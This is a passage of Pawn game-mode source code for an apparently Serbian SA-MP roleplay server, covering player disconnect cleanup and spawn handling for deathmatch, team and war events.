		ServerInfo[ PaketVreme ] = 3;
		SetTimer_("SmanjiPaketVreme", 1000, 1000, 4);

       	ServerInfo[ PaketObject ] = CreateDynamicObject(328, PaketNewPos[ 0 ], PaketNewPos[ 1 ], PaketNewPos[ 2 ], 0.0, 0.0, 0.0, 0, 0, -1, .priority = 1);

        new stringzone[ MAX_ZONE_NAME ];
        format( stringzone, sizeof( stringzone ), "%s", GetPlayerLocation( playerid ) );

		foreach( new i : Player)
		{
        	if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
			{
				SCMF( i, ZUTA, "(PAKET): Igracu {CCCCCC}%s(%s) {FFFF00}je ispao paket.", ImeIgraca( playerid ), org_info[ OrgID ][ oPreFix ] );
				SCMF( i, ZUTA, "(PAKET): Lokacija: {FFFFFF}%s.", stringzone );
				SendClientMessage( i, ZUTA, "(PAKET): Ukoliko niko ne pokupi paket narednih 10 minuta, paket ce nestati." );
			}
		}
		ServerInfo[ PaketTimer ] = SetTimer_("DestroyPaket", 1, 600000, 1);
	}

    if( IsPlayerInAnyVehicle( playerid ) )
	{
        new Float:x, Float:y, Float:z, vehicleid = GetPlayerVehicleID(playerid);
		GetVehiclePos( vehicleid,x, y, z );
		RealVehiclePositions[ vehicleid ][ 0 ] = x;
		RealVehiclePositions[ vehicleid ][ 1 ] = y;
		RealVehiclePositions[ vehicleid ][ 2 ] = z;
	}

    if( SearchNadji[ playerid ] != -1 )
	{
		SearchNadji[ playerid ] = -1;
	    SMG_DisablePlayerCheckpoint( playerid);
	}

	if( tdm_player_info[ playerid ][ tdm_Team ] != 0 )
	{
        for( new i = 0; i < 21; i ++) TextDrawHideForPlayer( playerid, TDM_gTD[ i ] );

		PlayerTextDrawHide( playerid, TDMplayerScore_pTD[ playerid ] );
		PlayerTextDrawDestroy( playerid, TDMplayerScore_pTD[ playerid ] );
		TDMplayerScore_pTD[ playerid ] = PlayerText:INVALID_TEXT_DRAW;
	}

	#if ZIMSKI_MOD == 1

    	if( Snow[ playerid ] ) DestroyPlayerObject( playerid, SnowObject[ playerid ] );

    	for(new i = 0; i < sizeof(snowStreet); i++) Streamer_ToggleItem(playerid, STREAMER_TYPE_OBJECT, snowStreet[i], false);

    #endif

	if( EventInfo[ Started ] != 0 && PlayerInvited[ playerid ] != 0 )
	{
		EventInfo[ Drivers ]--;
		if(PlayerEventVehID[ playerid ] != -1)
		{
			VehicleObjectCheck( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
		    ResetVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
			SMG_DestroyVehicle( EventInfo[ Vehicle ][ PlayerEventVehID[ playerid ] ] );
			PlayerEventVehID[ playerid ] = -1;
		}
		PlayerInvited[ playerid ] = 0;
		PlayerCP[playerid] = 0;
	}

    if( PlayerInBlowJob[ playerid ] != 0 )
	{
		switch( PlayerInBlowJob[ playerid ] )
		{
	        case 1:
			{
				DestroyDynamicActor( Sex_Lisa );
				WhoreLisa = false;
			}
	        case 2:
			{
				DestroyDynamicActor( Sex_Angelina );
				WhoreAngelina = false;
			}
	        case 3:
			{
				DestroyDynamicActor( Sex_Mia );
				WhoreMia = false;
			}
	        case 4:
			{
				DestroyDynamicActor( Sex_Sendy );
				WhoreSendy = false;
			}
		}

		StopAudioStreamForPlayer( playerid );
	    SetCameraBehindPlayer( playerid );
        PlayerInBlowJob[ playerid ] = 0;
    	SexTDControl( playerid, false );
    	BlowJobCount[ playerid ] = 0;
	    TogPlayerHud( playerid );
	    SMG_TogglePlayerControllable( playerid, ( true ) );
		ClearAnimations( playerid );
    	KillTimer(PusenjeTimer[playerid]);
	}

    switch( reason )
	{
		case 0:
		{
			DodajWarnRed("~p~(DISCONNECT) %s ~w~je izas%s sa servera. ~p~(crash)", ImeIgraca(playerid), getPolForString(playerid, "ao", "la"));
			SendNearbyMessage(playerid, 60.0, 0xCCCCCCCC, "** (( %s je napusti%s server (crash) ))", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
		}
		case 1:
		{
			DodajWarnRed("~p~(DISCONNECT) %s ~w~je izas%s sa servera. ~p~(/q)", ImeIgraca(playerid), getPolForString(playerid, "ao", "la"));
			SendNearbyMessage(playerid, 60.0, 0xCCCCCCCC, "** (( %s je napusti%s server (disconnect) ))", ImeIgraca( playerid ), getPolForString(playerid,"o","la") );
		}
	}

    if(PoliceComputer[playerid])
	{
        Police_TVTDControl( playerid, false );
        PoliceComputer[playerid] = false;
    }

    DestroyPlayerTextDraws( playerid );

	if( AdminVozilo[ playerid ] != -1 ) VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( AdminVozilo[ playerid ] ), ResetVehicle( AdminVozilo[ playerid ] ), AdminVozilo[ playerid ] = -1;
	if( VipVozilo[ playerid ] != -1 ) VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( VipVozilo[ playerid ] ), ResetVehicle( VipVozilo[ playerid ] ), VipVozilo[ playerid ] = -1;
	if( PromoterVozilo[ playerid ] != -1 ) VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PromoterVozilo[ playerid ] ), ResetVehicle( PromoterVozilo[ playerid ] ), PromoterVozilo[ playerid ] = -1;
	if( YTVozilo[ playerid ] != -1 ) VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( YTVozilo[ playerid ] ), ResetVehicle( YTVozilo[ playerid ] ), YTVozilo[ playerid ] = -1;
	if( PosaoVozilo[ playerid ] != -1 ) VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoVozilo[ playerid ] ), ResetVehicle( PosaoVozilo[ playerid ] ), PosaoVozilo[ playerid ] = -1;
	if( PosaoTrailer[ playerid ] != -1 ) VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoTrailer[ playerid ] ), ResetVehicle( PosaoTrailer[ playerid ] ), PosaoTrailer[ playerid ] = -1;
	if( TrkaVozilo[ playerid ] != -1 ) SMG_DestroyVehicle( TrkaVozilo[ playerid ] ), ResetVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;
	if( RentVozilo[ playerid ] != -1 )
	{
		KillTimer(RentTimer[playerid]);
		VehicleObjectCheck( RentVozilo[ playerid ] ), VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]), ResetVehicle( RentVozilo[ playerid ] ), SMG_DestroyVehicle( RentVozilo[ playerid ] ), RentVozilo[ playerid ] = -1;
	}

	if( HitmanInfo[ playerid ][ GotHit ] > 0)
	{
	    if( HitmanInfo[ playerid ][ GetChased ] < 999 )
		{
	        if( IsPlayerConnected( HitmanInfo[ playerid ][ GetChased ] ) )
			{
	        	SendClientMessage( HitmanInfo[ playerid ][ GetChased ], ZUTA, "(CONTRACT): Vasa meta je izasla sa servera." );
	            HitmanInfo[ HitmanInfo[ playerid ][ GetChased ] ][ GoChase ] = 999;
			}
	    }
	}

	if( IDVozilaKojimSverca[ playerid ] != -1 ) KutijaMatsa[ IDVozilaKojimSverca[ playerid ] ] = false;
	if( PljackaVreme[ playerid ] > 0 )
	{
		KillTimer(PljackanjeBankeTimer[ playerid ]);
		PljackaUToku = false;
	}

	PljackaNovac[ playerid ] = 0, PljackaVreme[ playerid ] = 0;

	if( ZlatoVreme[ playerid ] > 0 )
	{
		KillTimer(PljackanjeZlatareTimer[playerid]);
		ZlataraUToku = false;
	}

	PljackaZlato[ playerid ] = 0;
	ZlatoVreme[ playerid ] = 0;

	ToggedPM[playerid] = false;
	ToggedWISP[playerid] = false;
    ToggedFR[playerid] = false;

    StartingVehicle[playerid] = false;
    GovRepairCooldown[playerid] = gettime();
    RequestingBackup[playerid] = false;
    CuffTimerCalled[playerid] = false;
    PokusajProvala[playerid] = false;
    TicketOffer[playerid] = -1;
    TicketMoney[playerid] = 0;
    ShakeOffer[playerid] = -1;
	Mobile[playerid] = -1;
	CellTime[playerid] = 0;
	CallCost[playerid] = 0;
	PlayerDruggedSeconds[playerid] = 0;
	LocatingCar[playerid] = false;
	GPSTimerCalled[playerid] = false;
	StartingVehicle[playerid] = false;
	PoliceComputer[playerid] = false;
	JobDuty[playerid] = false;
	ImmobTimerCalled[playerid] = false;
	OfficerUndercover[playerid] = false;
	gSmoking[playerid] = 0;

    BreakingVehicle[playerid] = -1;
	BreakLockTimerCalled[playerid] = 0;
	BreakingLock[playerid] = 0;
	breaksecounds[playerid] = 0;
	immobsecounds[playerid] = 0;

	if( DragedPlayerID[ playerid ] != -1 )
	{
		SendInfoMessage( DragedPlayerID[ playerid ], "%s je napustio server, pusteni ste.", ImeIgraca( playerid ) );
		SMG_TogglePlayerControllable( DragedPlayerID[ playerid ], true );
		Draged[ DragedPlayerID[ playerid ] ] = -1;
	}

    KillTimer(_progressatmbar[playerid]);

	if(PocetniIntroStartovan[playerid] == true) 
	{
		KillTimer(pocetni_intro[playerid]);
	}

	if(as_Buying[playerid] == true)
	{
		as_Buying[playerid] = false;
		ControlTextDrawVehBuy(playerid, false);
		TogPlayerHud(playerid);
	}

    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true )
	{
        WARPoruka( WARPInfo[ playerid ][ WARIgrac ], 0xFF9900FF, "(WAR): {FFFFFF}%s {FF9900}je napustio WAR.", ImeIgraca( playerid ) );
		WARInfo[ WARPInfo[ playerid ][ WARIgrac ] ][ WARTimClanovi ][ 0 ]--;
	}
	if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true )
	{ 
        WARPoruka( WARPInfo[ playerid ][ WARIgrac ], 0xFF9900FF, "(WAR): {FFFFFF}%s {FF9900}je napustio WAR.", ImeIgraca( playerid ) );
		WARInfo[ WARPInfo[ playerid ][ WARIgrac ] ][ WARTimClanovi ][ 1 ]--;
	}

    if( PlayerCuffed[ playerid ] >= 1 )
	{
		if( PlayerInfo[ playerid ][ xZatvor ] == 0 )
		{
			PlayerInfo[ playerid ][ xZatvor ] = JAIL;
			PlayerInfo[ playerid ][ xZatvorVreme ] = 60;
			strmid( PlayerInfo[ playerid ][ xOffPJail ], "LTA", 0, strlen("LTA"), 64 );
			sql_user_update_string( playerid, "offpjail", PlayerInfo[ playerid ][ xOffPJail ] );
		}
	}

	if( PlayerInfo[ playerid ][ xWanted ] > 0 )
	{
		if( PlayerInfo[ playerid ][ xZatvor ] == 0 )
		{
		    foreach( new i : Player)
			{
				if( GetFactionType( i ) == ORG_TIP_VLADINA && CrimInRange( 40.0, playerid, i ) )
				{
				    PlayerInfo[ playerid ][ xLeaveJail ] = 1;
					PlayerInfo[ playerid ][ xZatvor ] = JAIL;
					PlayerInfo[ playerid ][ xZatvorVreme ] = 10*PlayerInfo[ playerid ][ xWanted ];
					new price = PlayerInfo[ playerid ][ xWanted ]*10000;
					//if( price > 30000 ) price = 30000;
					PlayerInfo[ playerid ][ xNovac ] -= price;
					PlayerInfo[ playerid ][ xWanted ] = 0;

					new qas[ 190 ];
					mysql_format( mSQL, qas, sizeof(qas), "UPDATE `users` SET `money` = '%d', `wanted_level` = '%d', `leave_jail` = '%d' WHERE `user_id` = '%d' LIMIT 1",
												    PlayerInfo[ playerid ][ xNovac ],
												    PlayerInfo[ playerid ][ xWanted ],
													PlayerInfo[ playerid ][ xLeaveJail ],
													PlayerInfo[ playerid ][ xID ] );
					mysql_tquery( mSQL, qas );
				}
			}
		}
	}

	if(BreakingLock[playerid] == 1) KillTimer(BreakLockTimer[playerid]);
	if(ImmobTimerCalled[playerid]) KillTimer(immobcounttimer[playerid]);
	if(BreakLockTimerCalled[playerid] == 1) KillTimer(breakcounttimer[playerid]);

	if( BoomboxInfo[ playerid ][ boomboxPlaced ] )
	{
        Boombox_Destroy( playerid );
    }

	if( PlayerLogged[ playerid ] == true )
	{
		sql_user_update_disc( playerid );
	}

    if( TrashSearch[ playerid ] == 1 )
	{
		KillTimer(TrashTimer[playerid]);
	}

    if(RequestingBackup[playerid])
	{
		KillTimer(_backupclear[playerid]);
		BackupClear(playerid, 0);
	}

    if(CuffTimerCalled[playerid]) KillTimer(tazovan_tajmer[playerid]);

    if(AdminDuty[playerid]) AdminDuty[playerid] = false;
    
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSpecAdmin ] >= 1 || PlayerInfo[ playerid ][ xGamemaster ] >= 2 )
	{
        if( WatchingTV{ playerid } == 1 )
		{
			PlayerTextDrawHide( playerid, SpecTextDraw[ playerid ] );
			TogglePlayerSpectating( playerid, false );
			SMG_TogglePlayerControllable( playerid, true );
			Spectate[ playerid ] = -1;
			PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);

			if( PlayerInfo[ playerid ][ xAdmin ] < 7 )
			{
				AdminMsg( ADM_WARN, "[ADMIN] %s je prestao sa specom (Izasao sa srw).", ImeIgraca( playerid ) );
			}

			VecjeUsao[ playerid ] = true;
			WatchingTV{ playerid } = 0;
        }
    }
	return 1;
}

UpdateBankTD( playerid )
{
    new stringic[ 15 ];
	format(stringic, sizeof(stringic), "$%d", PlayerInfo[playerid][xBRacun]);
	PlayerTextDrawSetString( playerid, Ingame_pTD[playerid][37], stringic );
    PlayerTextDrawShow(playerid, Ingame_pTD[playerid][37]);
}

_:public SetPlayerTDStats(playerid)
{
    UpdateBankTD(playerid);

	//PlayerTextDrawShow(playerid, Ingame_pTD[playerid][1]);
    SMG_SetPlayerWantedLevel(playerid, PlayerInfo[playerid][xWanted]);
}

getPolForString(playerid, const str1[], const str2[])
{
	new str[5];
	switch(PlayerInfo[playerid][xPol])
	{
		case 1: format(str, 5, "%s", str1);
		case 2: format(str, 5, "%s", str2);
	}
	return str;
}

public OnPlayerSpawn( playerid )
{
    if( PlayerLogged[ playerid ] == true )
	{
		SetPlayerTDStats( playerid );
    	PocetniNovac( playerid, PlayerInfo[ playerid ][ xNovac ] );
		SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
    	SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
    	SetPlayerInterior( playerid, 0 );
    	SetPlayerVirtualWorld( playerid, 0 );
    }

    if( AdminVozilo[ playerid ] != -1 ) VehicleInfo[ AdminVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ AdminVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( AdminVozilo[ playerid ] ), ResetVehicle( AdminVozilo[ playerid ] ), AdminVozilo[ playerid ] = -1;
	if( VipVozilo[ playerid ] != -1 ) VehicleInfo[ VipVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ VipVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( VipVozilo[ playerid ] ), ResetVehicle( VipVozilo[ playerid ] ), VipVozilo[ playerid ] = -1;
	if( PromoterVozilo[ playerid ] != -1 ) VehicleInfo[ PromoterVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PromoterVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PromoterVozilo[ playerid ] ), ResetVehicle( PromoterVozilo[ playerid ] ), PromoterVozilo[ playerid ] = -1;
	if( YTVozilo[ playerid ] != -1 ) VehicleInfo[ YTVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ YTVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( YTVozilo[ playerid ] ), ResetVehicle( YTVozilo[ playerid ] ), YTVozilo[ playerid ] = -1;
	if( PosaoVozilo[ playerid ] != -1 ) VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoVozilo[ playerid ] ), ResetVehicle( PosaoVozilo[ playerid ] ), PosaoVozilo[ playerid ] = -1;
	if( PosaoTrailer[ playerid ] != -1 ) VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]), SMG_DestroyVehicle( PosaoTrailer[ playerid ] ), ResetVehicle( PosaoTrailer[ playerid ] ), PosaoTrailer[ playerid ] = -1;
	if( TrkaVozilo[ playerid ] != -1 ) SMG_DestroyVehicle( TrkaVozilo[ playerid ] ), ResetVehicle( TrkaVozilo[ playerid ] ), TrkaVozilo[ playerid ] = -1;
	if( RentVozilo[ playerid ] != -1 )
	{
		KillTimer(RentTimer[playerid]);
		VehicleObjectCheck( RentVozilo[ playerid ] ), VehicleInfo[ RentVozilo[ playerid ] ][ Validv3DText ] = false, DestroyDynamic3DTextLabel(VehicleInfo[ RentVozilo[ playerid ] ][ v3DText ]), ResetVehicle( RentVozilo[ playerid ] ), SMG_DestroyVehicle( RentVozilo[ playerid ] ), RentVozilo[ playerid ] = -1;
	}

    foreach(new id : iter_gZone)
	{
        new stringic[ 24 ];
		if( gZoneInfo[ id ][ gZone_ID ] > 0 )
		{
            format( stringic, sizeof( stringic ), "0x%s66", gZoneInfo[ id ][ gZoneColor ] );

            ShowZoneForPlayer(playerid, id, HexToInt( stringic ));
		}
	}

	if( WARPInfo[ playerid ][ WARIgrac ] != -1 )
	{
	    new w = WARPInfo[ playerid ][ WARIgrac ];

		SetPlayerVirtualWorld( playerid, w );
		SetPlayerHealth( playerid, 100 );
		SetPlayerArmour( playerid, 100 );
		if( WARInfo[ w ][ WARMapa ] == 1 )
		{
		    new rand1 = random( sizeof( RandomWARMapa11 ) );
		    new rand2 = random( sizeof( RandomWARMapa12 ) );
		    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa11[ rand1 ][ 0 ], RandomWARMapa11[ rand1 ][ 1 ],RandomWARMapa11[ rand1 ][ 2 ] ); }
		    else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa12[ rand2 ][ 0 ], RandomWARMapa12[ rand2 ][ 1 ],RandomWARMapa12[ rand2 ][ 2 ] ); }
			SetPlayerInterior( playerid, 0 );
		}
		else if( WARInfo[ w ][ WARMapa ] == 2 )
		{
		    new rand1 = random( sizeof( RandomWARMapa21 ) );
		    new rand2 = random( sizeof( RandomWARMapa22 ) );
		    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa21[ rand1 ][ 0 ], RandomWARMapa21[ rand1 ][ 1 ],RandomWARMapa21[ rand1 ][ 2 ] ); }
		    else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa22[ rand2 ][ 0 ], RandomWARMapa22[ rand2 ][ 1 ],RandomWARMapa22[ rand2 ][ 2 ] ); }
			SetPlayerInterior( playerid, 10 );
		}
		else if( WARInfo[ w ][ WARMapa ] == 3 )
		{
		    new rand1 = random( sizeof( RandomWARMapa31 ) );
		    new rand2 = random( sizeof( RandomWARMapa32 ) );
		    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa31[ rand1 ][ 0 ], RandomWARMapa31[ rand1 ][ 1 ],RandomWARMapa31[ rand1 ][ 2 ] ); }
		    else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa32[ rand2 ][ 0 ], RandomWARMapa32[ rand2 ][ 1 ],RandomWARMapa32[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
		}
		else if( WARInfo[ w ][ WARMapa ] == 4 )
		{
		    new rand1 = random( sizeof( RandomWARMapa41 ) );
		    new rand2 = random( sizeof( RandomWARMapa42 ) );
		    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa41[ rand1 ][ 0 ], RandomWARMapa41[ rand1 ][ 1 ], RandomWARMapa41[ rand1 ][ 2 ] ); }
		    else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa42[ rand2 ][ 0 ], RandomWARMapa42[ rand2 ][ 1 ], RandomWARMapa42[ rand2 ][ 2 ] ); }
            SetPlayerInterior( playerid, 0 );
		}
		else if( WARInfo[ w ][ WARMapa ] == 5 )
		{
		    new rand1 = random( sizeof( RandomWARMapa51 ) );
		    new rand2 = random( sizeof( RandomWARMapa52 ) );
		    if( WARPInfo[ playerid ][ WARTim ][ 0 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa51[ rand1 ][ 0 ], RandomWARMapa51[ rand1 ][ 1 ],RandomWARMapa51[ rand1 ][ 2 ] ); }
		    else if( WARPInfo[ playerid ][ WARTim ][ 1 ] == true ) { SMG_SetPlayerPos( playerid, RandomWARMapa52[ rand2 ][ 0 ], RandomWARMapa52[ rand2 ][ 1 ],RandomWARMapa52[ rand2 ][ 2 ] ); }
		    SetPlayerInterior( playerid, 0 );
		}
		GiveWeaponToPlayer( playerid, WARInfo[ w ][ WAROruzje ][ 0 ], 300 );
		GiveWeaponToPlayer( playerid, WARInfo[ w ][ WAROruzje ][ 1 ], 300 );
		GiveWeaponToPlayer( playerid, WARInfo[ w ][ WAROruzje ][ 2 ], 300 );
		GiveWeaponToPlayer( playerid, WARInfo[ w ][ WAROruzje ][ 3 ], 300 );

		PlayerInfo[ playerid ][ xSpawned ] = 1;
		return 1;
    }
    else if( tdm_player_info[ playerid ][ tdm_Team ] != 0 )
	{
        if( tdm_player_info[ playerid ][ tdm_Team ] == 1 )
		{
            SetPlayerHealth( playerid, 100 );
			SetPlayerArmour( playerid, 100 );

			new rand = random( 3 );
			if( rand == 0 )
			{
				SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos ][ 2 ] );
			}
			else if( rand == 1 )
			{
				SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos1 ][ 2 ] );
			}
			else if( rand == 2 )
			{
				SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ctPos2 ][ 2 ] );
			}

			SetPlayerInterior( playerid, tdm_mapInfo[ tdm_ServerMap ][ mInt ] );
			SetPlayerVirtualWorld( playerid, tdm_mapInfo[ tdm_ServerMap ][ mVW] );

			UcitajObjekte( playerid );
			SetCameraBehindPlayer( playerid );

			GiveWeaponToPlayer( playerid, 24, 999 );
			GiveWeaponToPlayer( playerid, 25, 999 );
			GiveWeaponToPlayer( playerid, 29, 999 );
			GiveWeaponToPlayer( playerid, 31, 999 );

			SMG_SetPlayerSkin( playerid, 285 );
        }
        else if( tdm_player_info[ playerid ][ tdm_Team ] == 2 )
		{
            SetPlayerHealth( playerid, 100 );
			SetPlayerArmour( playerid, 100 );

			new rand = random( 3 );
			if( rand == 0 )
			{
		      	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos ][ 2 ] );
			}
			else if( rand == 1 )
			{
			   	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos1 ][ 2 ] );
			}
			else if( rand == 2 )
			{
			   	SMG_SetPlayerPos( playerid, tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 0 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 1 ], tdm_mapInfo[ tdm_ServerMap ][ ttPos2 ][ 2 ] );
			}

			SetPlayerInterior( playerid, tdm_mapInfo[ tdm_ServerMap ][ mInt ] );
			SetPlayerVirtualWorld( playerid, tdm_mapInfo[ tdm_ServerMap ][ mVW] );

			UcitajObjekte( playerid );
			SetCameraBehindPlayer( playerid );

			GiveWeaponToPlayer( playerid, 24, 999 );
			GiveWeaponToPlayer( playerid, 25, 999 );
			GiveWeaponToPlayer( playerid, 29, 999 );
			GiveWeaponToPlayer( playerid, 30, 999 );

			SMG_SetPlayerSkin( playerid, 293 );
        }

        PlayerInfo[ playerid ][ xSpawned ] = 1;
    }
    else if( NaDmEventu[ playerid ] == true )
	{
        new rand = random( sizeof( RandomDMPos ) );
		SMG_SetPlayerPos( playerid, RandomDMPos[ rand ][ 0 ], RandomDMPos[ rand ][ 1 ],RandomDMPos[ rand ][ 2 ] );
		SetPlayerFacingAngle( playerid, 360.000 );
		SetCameraBehindPlayer( playerid );
		SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld( playerid, 10 );

        PlayerInfo[ playerid ][ xSpawned ] = 1;

		if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4500 )
		{
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 28, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_SAWNOFF_SHOTGUN, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 4000 )
		{
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 32, 800 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3500 )
		{
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 28, 800 );
			GiveWeaponToPlayer( playerid, 31, 400 );
			SetPlayerSkillLevel( playerid, WEAPONSKILL_MICRO_UZI, 999 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 3000 )
		{
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 27, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2500 )
		{
		    GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 2000 )
		{
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 26, 150 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 30, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1500 )
		{
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 31, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 1000 )
		{
			GiveWeaponToPlayer( playerid, 24, 150 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
			GiveWeaponToPlayer( playerid, 30, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 500 )
		{
			GiveWeaponToPlayer( playerid, 24, 200 );
			GiveWeaponToPlayer( playerid, 25, 100 );
			GiveWeaponToPlayer( playerid, 29, 400 );
		}
		else if( PlayerInfo[ playerid ][ xDMEventUbistva ] >= 0 )
		{
			GiveWeaponToPlayer( playerid, 24, 200 );
			GiveWeaponToPlayer( playerid, 25, 100 );
		}

		SetPlayerHealth( playerid, 100 );
		SetPlayerArmour( playerid, 100 );
        return 1;
    }
    else
	{
        PlayerInfo[ playerid ][ xSpawned ] = 1;
    	PostaviSpawn( playerid );
	}

    PlayerInfo[ playerid ][ xSpawned ] = 1;

    SMG_SetPlayerWantedLevel( playerid, PlayerInfo[ playerid ][ xWanted ] );

    if( first_spawn[ playerid ] )
	{
